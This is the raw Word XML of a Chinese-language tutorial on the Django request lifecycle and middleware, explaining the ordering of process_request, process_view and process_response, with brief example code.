          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的生命周期内到底发生了什么呢</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>??</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F39557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1. </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>当用户在浏览器中输入</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>时</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浏览器会生成请求头和请求体发给服务端</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求头和请求体中会包含浏览器的动作</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(action),</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>这个动作通常为</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>或者</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>post,</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>体现在</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>之中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="258F736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2. url</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>经过</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中的</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>wsgi,</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>再经过</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的中间件</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最后</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>到过路由映射表</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在路由中一条一条进行匹配</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>一旦其中一条匹配成功就执行对应的视图函数</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后面的路由就不再继续匹配了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4B9F8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3. </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>视图函数根据客户端的请求查询相应的数据</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返回给</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然后</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把客户端想要的数据做为一个字符串返回给客户端</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F338E6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4. </w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>客户端浏览器接收到返回的数据</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经过渲染后显示给用户</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E9E9A5"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中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53B520A7"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process_request方法都执行完后，匹配路由，找到要执行的视图函数，先不执行视图函数，先执行中间件中的process_view方法，process_view方法返回None，继续按顺序执行，所有process_view方法执行完后执行视图函数。假如中间件3 的process_view方法返回了HttpResponse对象，则4,5,6的process_view以及视图函数都不执行，直接从最后一个中间件，也就是中间件6的process_response方法开始倒序执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66B28BF8"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什么是中间件？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB0991C"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django中间件是django的门户 任何的请求来和响应走都需要经过中间件，所以中间件在做一些网站全局性的功能时特别好用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13EEB638" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="007C2612" w:rsidRDefault="008B2E56" w:rsidP="00173FC9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing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中间件能做什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47D13D2A" w14:textId="50AC176F" w:rsidR="008B2E56" w:rsidRPr="00173FC9" w:rsidRDefault="00173FC9" w:rsidP="00173FC9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1、</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="00173FC9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用户访问频率限制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41243E4A" w14:textId="612DA4BB" w:rsidR="008B2E56" w:rsidRPr="00173FC9" w:rsidRDefault="00173FC9" w:rsidP="00173FC9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="00173FC9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用户是否是黑名单 白名单</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2676620B" w14:textId="689F1B37" w:rsidR="008B2E56" w:rsidRPr="00173FC9" w:rsidRDefault="00173FC9" w:rsidP="00173FC9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="00173FC9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>所有用户登录校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="269C0C93" w14:textId="57A16F5A" w:rsidR="008B2E56" w:rsidRPr="00173FC9" w:rsidRDefault="00173FC9" w:rsidP="00173FC9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>4、</w:t>
      </w:r>
      <w:r w:rsidR="008B2E56" w:rsidRPr="00173FC9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>只要是涉及到网址全局的功能 你就应该考虑使用中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9B2F4E" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="007C2612" w:rsidRDefault="008B2E56" w:rsidP="00173FC9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing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中间件流程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B729D41" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="007C2612" w:rsidRDefault="008B2E56" w:rsidP="008B2E56">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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="125DEC8A" wp14:editId="38482268">
            <wp:extent cx="4601287" cy="3866147"/>
            <wp:effectExtent l="0" t="0" r="8890" b="1270"/>
            <wp:docPr id="3" name="图片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2092" cy="3875226"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="170778E5"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process_request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B59819" w14:textId="77777777" w:rsidR="008B2E56"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E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>1.</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求来的时候</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会按照</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>settings</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>配置文件中从上往下的顺序依次执行每一个中间件里面的</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>process_request</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2.</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中间件里面如果没有定义该方法</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直接跳过执行下一个</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3.process_request</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法</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内如果你自己返回了</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HttpResponse</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对象</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那么不再往后执行</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直接跳到同级别的</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>process_response</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4B91">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1598C5A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 process_request(self,request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20E492C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w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>我是第一个自定义中间件里面的</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>process_request</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE0C69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return HttpResponse("</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>我是第一个自定义中间件里面的</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>HttpResponse</w:t>
      </w:r>
      <w:r w:rsidRPr="007C2612">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对象返回值</w:t>
      </w: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直接原地返回</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="792EB1CB" w14:textId="77777777" w:rsidR="008B2E56"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process_response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F67A22C" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="001075EB"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1075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>1.</w:t>
      </w:r>
      <w:r w:rsidRPr="001075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="001075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>响应走的时候</w:t>
      </w:r>
      <w:r w:rsidRPr="001075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>会按照</w:t>
      </w:r>
      <w:r w:rsidRPr="001075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>settings</w:t>
      </w:r>
      <w:r w:rsidRPr="001075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>配置文件中从下往上的顺序依次执行每一个中间件里面的</w:t>
      </w:r>
      <w:r w:rsidRPr="001075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>process_response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C53B58" w14:textId="77777777" w:rsidR="008B2E56" w:rsidRPr="001075EB"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1075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidRPr="001075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="001075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>该方法必须将形参</w:t>
      </w:r>
      <w:r w:rsidRPr="001075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>response</w:t>
      </w:r>
      <w:r w:rsidRPr="001075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>返回</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A824BC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1075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>3.</w:t>
      </w:r>
      <w:r w:rsidRPr="001075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="001075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>如果没有定义该方法</w:t>
      </w:r>
      <w:r w:rsidRPr="001075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001075EB">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>直接跳过执行下一个</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A1DC9A"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自定义中间件</w:t>
      </w:r>
    </w:p>
